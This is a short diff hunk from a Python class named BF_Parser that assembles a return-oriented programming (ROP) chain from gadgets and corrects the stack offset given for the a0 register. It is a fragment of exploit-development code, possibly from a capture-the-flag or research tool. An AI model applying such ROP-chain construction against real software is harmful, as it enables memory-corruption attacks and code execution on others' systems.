@@ -280,7 +280,7 @@ class BF_Parser():
                                                     )
 
         rop_chain += self.__beqz_a0.construct_frame(ra=self.__add_a0_s0.get_vaddr(), \
-                                                    a0=zero_sp + 0x50 \
+                                                    a0=zero_sp + 0x50 + self.__pop_s0.get_frame_size() \
                                                     )
 
         rop_chain += self.__add_a0_s0.construct_frame(ra=self.__mov_s0_a0.get_vaddr())
